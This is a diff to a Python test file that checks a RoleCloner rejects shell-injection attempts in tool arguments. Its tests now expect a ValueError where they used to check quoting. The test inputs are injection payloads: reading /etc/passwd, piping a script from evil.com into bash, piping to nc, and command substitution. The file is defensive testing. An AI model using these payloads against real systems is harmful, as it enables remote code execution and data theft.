@@ -145,9 +145,8 @@ class TestWriteShellProcessorRejectsInjection:
             clone_path.mkdir()
             proc = {"tool": "whisper.cpp",
                     "args": "-m model.bin ; cat /etc/passwd"}
-            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
-            content = result.read_text()
-            assert "';'" in content
+            with pytest.raises(ValueError, match="forbidden shell character"):
+                cloner._write_shell_processor(clone_path, proc, kind="whisper")
 
     def test_args_command_substitution_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
@@ -156,9 +155,8 @@ class TestWriteShellProcessorRejectsInjection:
             clone_path.mkdir()
             proc = {"tool": "whisper.cpp",
                     "args": "$(curl http://evil.com/shell.sh | bash)"}
-            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
-            content = result.read_text()
-            assert "'$(curl'" in content
+            with pytest.raises(ValueError, match="forbidden shell character"):
+                cloner._write_shell_processor(clone_path, proc, kind="whisper")
 
     def test_args_backtick_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
@@ -166,9 +164,8 @@ class TestWriteShellProcessorRejectsInjection:
             clone_path = Path(td) / "clone"
             clone_path.mkdir()
             proc = {"tool": "whisper.cpp", "args": "`id`"}
-            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
-            content = result.read_text()
-            assert "'`id`'" in content
+            with pytest.raises(ValueError, match="forbidden shell character"):
+                cloner._write_shell_processor(clone_path, proc, kind="whisper")
 
     def test_args_pipe_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
@@ -176,9 +173,8 @@ class TestWriteShellProcessorRejectsInjection:
             clone_path = Path(td) / "clone"
             clone_path.mkdir()
             proc = {"tool": "whisper.cpp", "args": "-m model.bin | nc evil"}
-            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
-            content = result.read_text()
-            assert "'|'" in content
+            with pytest.raises(ValueError, match="forbidden shell character"):
+                cloner._write_shell_processor(clone_path, proc, kind="whisper")
 
     def test_args_newline_injection_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
@@ -196,9 +192,8 @@ class TestWriteShellProcessorRejectsInjection:
             clone_path = Path(td) / "clone"
             clone_path.mkdir()
             proc = {"tool": "whisper.cpp", "args": "& ping evil.com &"}
-            result = cloner._write_shell_processor(clone_path, proc, kind="whisper")
-            content = result.read_text()
-            assert "'&'" in content
+            with pytest.raises(ValueError, match="forbidden shell character"):
+                cloner._write_shell_processor(clone_path, proc, kind="whisper")
 
     def test_binary_path_traversal_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
@@ -238,9 +233,8 @@ class TestMaterializeProcessorRejects:
             clone_path = Path(td) / "clone"
             clone_path.mkdir()
             proc: dict[str, object] = {"tool": "ffmpeg", "args": "$(id)"}
-            result = cloner.materialize_processor(clone_path, proc)
-            content = result.read_text()
-            assert "'$(id)'" in content
+            with pytest.raises(ValueError, match="forbidden shell character"):
+                cloner.materialize_processor(clone_path, proc)
 
     def test_unknown_tool_still_rejected(self):
         cloner = RoleCloner(collection_root=Path("/tmp"))
